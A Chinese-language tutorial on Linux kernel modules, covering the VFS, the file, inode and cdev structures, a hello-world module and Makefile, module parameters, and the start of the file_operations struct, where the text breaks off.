<h1 id="linux-内核模块">Linux 内核模块</h1>
<h2 id="什么是-lkms">什么是 LKMs</h2>
<p>LKMs
称为可加载核心模块（内核模块），其可看作是运行在内核空间的可执行程序，类似于
Linux 下的 ELF，包括：</p>
<ul>
<li>驱动程序
<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>....</li>
</ul></li>
<li>内核拓展模块</li>
</ul>
<p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF ，Windows
下为 exe/dll ，mac 下为 MACH-O ，因此我们可以使用 IDA
等工具来分析内核模块。</p>
<p>模块可以被单独编译，但不能单独运行，它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p>
<p>模块通常用来实现一种文件系统，一个驱动程序或者其它内核上层的功能。</p>
<blockquote>
<p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic
kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
</blockquote>
<p>通常情况下 Kernel 漏洞的发生也常见于加载的 LKMs 出现问题。</p>
<h2 id="相关指令">相关指令</h2>
<ul>
<li><code>insmod</code>：将制定模块加载到内核中</li>
<li><code>rmmod</code>：从内核中卸载制定模块</li>
<li><code>lsmod</code>：列出已经加载的模块</li>
<li><code>modprobe</code>：添加或删除模块，<code>modprobe</code>在加载模块时会查找依赖关系</li>
</ul>
<h2 id="文件系统-1">文件系统</h2>
<p>在Linux系统的视角下，无论是文件、设备、管道、还是目录，进程，甚至是磁盘，套接字等等，一切都可以被抽象成文件，一切都可以使用访问文件的方式进行操作。
图中所示为Linux中虚拟文件系统（VFS）、磁盘/Flash文件系统及一般的设备文件与设备驱动程序之间的关系。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/56602153f7522e83bf5f7ac3f41d6ecf.png"
                     
                      
                
                > 应用程序和
<code>VFS</code> 之间的接口是系统调用，而 <code>VFS</code>
与文件系统以及设备文件之间的接口是 <code>file_operations</code>
结构体成员函数，这个结构体包含对文件进行打开、关闭、读写、控制的一系列成员函数。</p>
<h3 id="file-结构体">file 结构体</h3>
<p><code>file</code>
结构体代表一个打开的文件，系统中每个打开的文件在内核空间都有一个关联的
<code>struct file</code>
。它由内核在打开文件时创建，并传递给在文件上进行操作的任何函数。在文件的所有实例都关闭后，内核释放这个数据结构。在内核和驱动源代码中，<code>struct file</code>
的指针通常被命名为 <code>file</code> 或 <code>filp</code> 。
<code>linux-5.17/include/linux/fs.h: file</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">file</span> &#123;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">llist_node</span>	fu_llist;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">rcu_head</span> 	fu_rcuhead;</span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">path</span>		f_path;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">inode</span>		*f_inode;	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">file_operations</span>	*f_op;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="keyword">enum</span> <span class="title class_">rw_hint</span>		f_write_hint;</span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> 		f_flags;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">mutex</span>		f_pos_lock;</span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">fown_struct</span>	f_owner;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span>	*f_cred;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">file_ra_state</span>	f_ra;</span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">hlist_head</span>	*f_ep;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">address_space</span>	*f_mapping;</span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((<span class="built_in">aligned</span>(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure></div>
<h3 id="inode结构体">inode结构体</h3>
<p>VFS
inode包含文件访问权限、所有者、组、大小、生成时间、访问时间、最后修改时间等信息。它是Linux管理文件系统的最基本单位，也是文件系统连接任何子目录、文件的桥梁。
<code>include/linux/fs.h: inode</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">inode</span> &#123;</span><br><span class="line">    <span class="type">umode_t</span>         i_mode; <span class="comment">// inode的权限</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid; <span class="comment">// inode所有者的id</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid; <span class="comment">// inode所属的群组id</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev; <span class="comment">// 若是设备文件，此字段将记录设备的设备号</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size; <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timespec</span>     i_atime; <span class="comment">// inode最近一次的存取时间</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timespec</span>     i_mtime; <span class="comment">// inode最近一次的修改时间</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timespec</span>     i_ctime; <span class="comment">// inode的产生时间</span></span><br><span class="line">    <span class="type">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;</span><br><span class="line">    <span class="type">blkcnt_t</span>        i_blocks; <span class="comment">// inode所使用的block数，一个block为512字节</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>  *i_pipe;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">block_device</span> *i_bdev; <span class="comment">// 若是块设备，为其对应的block_device结构体指针</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">cdev</span>     *i_cdev; <span class="comment">// 若是字符设备，为其对应的cdev结构体指针</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>
<p>查看 <code>/proc/devices</code>
文件可以获知系统中注册的设备，第一列为主设备号，第二列为设备名：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/devices</span></span><br><span class="line">Character devices:</span><br><span class="line">  1 mem</span><br><span class="line">  4 /dev/vc/0</span><br><span class="line">  4 tty</span><br><span class="line">  4 ttyS</span><br><span class="line">  5 /dev/tty</span><br><span class="line">  5 /dev/console</span><br><span class="line">  5 /dev/ptmx</span><br><span class="line">  ...</span><br><span class="line">Block devices:</span><br><span class="line">259 blkext</span><br><span class="line">  7 loop</span><br><span class="line">  8 sd</span><br><span class="line">  9 md</span><br><span class="line"> 11 sr</span><br><span class="line"> 65 sd</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure></div>
<p>查看 <code>/dev</code>
目录可以获知系统中包含的设备文件，日期前的两列对应设备的主设备号和次设备号：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -al /dev</span></span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x    8 root     root          2940 May  8 14:17 .</span><br><span class="line">drwxr-xr-x   11 root     root             0 May  8 14:18 ..</span><br><span class="line">drwxr-xr-x    2 root     root            60 May  8 14:17 bsg</span><br><span class="line">crw-rw----    1 root     root        5,   1 May  8 14:17 console</span><br></pre></td></tr></table></figure></div>
<p>主设备号是与驱动对应的概念，同一类设备一般用相同的主设备号，不同类设备的主设备号一般不同。</p>
<h2 id="内核模块开发">内核模块开发</h2>
<h3 id="hello-world模块">Hello World模块</h3>
<p>编写一个输出内容的<a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/LKMs_test/ko_test" >内核模块<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>。</p>
<p>首先在内核源码目录下创建一个用于编译内核模块的文件夹，这里我创建的文件夹的名称是
<code>myko</code> 。 在该目录下创建 <code>myko.c</code> ，内容如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;Hello, world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;Goodbye, cruel world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><code>linux/module.h</code>是<code>Linux</code>内核模块变成必须包含的头文件</p></li>
<li><p>头文件<code>kernel.h</code>包含了常用的内核函数</p></li>
<li><p>头文件<code>init.h</code>包含了宏<code>_init</code>和<code>_exit</code>,它们允许释放内核占用的内存。</p></li>
<li><p><code>hello_init</code>函数是模块初始化函数，他会在内核模块被加载的时候执行，使用<code>__init</code>进行修饰，一般用它来初始化数据结构等内容；</p></li>
<li><p><code>hello_exit</code>函数是模块的退出函数，他会在模块在退出的时候执行。</p></li>
<li><p>函数<code>module_init()</code>和<code>clearnup_exit()</code>是模块编程中最基本也是必须得两个函数，它用来指定模块加载和退出时调用的函数，这里加载的是我们上面定义好的两个函数，<code>module_init()</code>向内核注册模块提供新功能，而<code>cleanup_exit()</code>注销由模块提供的所用功能。</p></li>
<li><p>这段代码中使用了<code>printk</code>函数，这是内核打印函数，可以使用<code>dmesg</code>指令来看到内核打印信息。</p></li>
</ul>
<p>创建 <code>Makefile</code> ，内容如下：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := ~/Desktop/linux-5.17/</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">moduels_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>
<p>编译 <img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a577482dda67724b83501acf6c9c1e47.png"
                     
                      
                
                > 生成
<code>myko.ko</code> 驱动 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c3827c08733ff1c1e483b68a7219a30c.png"
                     
                      
                
                > 参考<a class="link" 
 target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/124501391" >环境搭建<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>，将其打包到文件系统中，然后启动系统。</p>
<p>可以看到，模块运行正常。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2b833dffac355164909bec5817f96202.png"
                     
                      
                
                ></p>
<h3 id="带参数的模块">带参数的模块</h3>
<p><code>myko.c</code> 内容修改为：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *whom = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> howmany = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">module_param</span>(howmany, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"><span class="built_in">module_param</span>(whom, charp, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; howmany; i++)</span><br><span class="line">        <span class="built_in">printk</span>(<span class="string">&quot;(%d) Hello, %s\n&quot;</span>, i, whom);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;Goodbye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure></div>
<p>参数必须使用<code>module_param</code>宏来声明，这个宏在<code>moduleparam.h</code>中定义。<code>module_param</code>需要三个参数：变量的名称、类型以及用于<code>sysfs</code>入口项的访问许可掩码，这个宏必须放在任何函数之外，通常在源文件头部。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2d026a01540a830c1dc2709f61f097bd.png"
                     
                      
                
                ></p>
<h2 id="字符设备驱动">字符设备驱动</h2>
<h3 id="字符设备驱动结构">字符设备驱动结构</h3>
<h4 id="cdev-结构体">cdev 结构体</h4>
<p><code>cdev</code> 为 linux 描述字符设备的一个结构。
<code>include/linux/cdev.h</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cdev</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kobject</span> kobj;         <span class="comment">// 内嵌的kobject对象</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">module</span> *owner;        <span class="comment">// 所属模块</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">file_operations</span> *ops; <span class="comment">// 文件操作结构体</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">list_head</span> list;</span><br><span class="line">    <span class="type">dev_t</span> dev;                   <span class="comment">// 设备号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>dev_t</code> 定义了设备号，为 32 位，其中 12 位为主设备号，20
位为次设备号。下面的宏可以获得主设备号和次设备号：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MAJOR</span>(<span class="type">dev_t</span> dev)</span><br><span class="line"><span class="built_in">MINOR</span>(<span class="type">dev_t</span> dev)</span><br></pre></td></tr></table></figure></div>
<p>使用下面的宏可以用主设备号和次设备号生成 dev_t ：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MKDEV</span>(<span class="type">int</span> major, <span class="type">int</span> minor)</span><br></pre></td></tr></table></figure></div>
<p>Linux 内核提供了一组函数用于操作 <code>cdev</code> 结构体：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="keyword">struct</span> file_operations *)</span></span>; <span class="comment">// 用于初始化cdev的成员，并建立cdev和file_operations之间的连接</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cdev</span> *<span class="built_in">cdev_alloc</span>(<span class="type">void</span>); <span class="comment">// 用于动态申请一个cdev内存</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cdev_put</span><span class="params">(<span class="keyword">struct</span> cdev *p)</span></span>;</span><br><span class="line"><span class="comment">// 用向系统添加和删除一个cdev，完成字符设备的注册和注销</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="type">dev_t</span>, <span class="type">unsigned</span>)</span></span>; <span class="comment">// 通常在字符设备驱动模块加载函数中调用</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cdev_del</span><span class="params">(<span class="keyword">struct</span> cdev *)</span></span>; <span class="comment">// 字符设备驱动模块卸载函数中调用</span></span><br></pre></td></tr></table></figure></div>
<p>在调用 <code>cdev_add()</code> 函数向系统注册字符设备之前，应首先调用
<code>register_chrdev_region()</code> 或
<code>alloc_chrdev_region()</code> 函数向系统申请设备号：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">register_chrdev_region</span><span class="params">(<span class="type">dev_t</span> from, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span></span>;</span><br></pre></td></tr></table></figure></div>
<p><code>register_chrdev_region()</code>
函数用于已知起始设备的设备号的情况，而
<code>alloc_chrdev_region()</code>
用于设备号未知，向系统动态申请未被占用的设备号的情况。</p>
<h4 id="file_operations-结构体">file_operations 结构体</h4>
<p><code>file_operations</code>
结构体中的成员函数是字符设备驱动程序设计的主体内容，这些函数实际会在应用程序进行
Linux 的 <code>open()</code> 、<code>write()</code>
、<code>read()</code> 、<code>close()</code>
等系统调用时最终被内核调用。
<code>include/linux/fs.h: file_operations</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">file_operations</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">module</span> *owner;</span><br><span class="line">    <span class="built_in">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="title">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span></span>;</span><br><span class="line">    <span class="built_in">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="built_in">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="built_in">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="built_in">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="built_in">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="built_in">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="built_in">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="built_in">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="built_in">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span 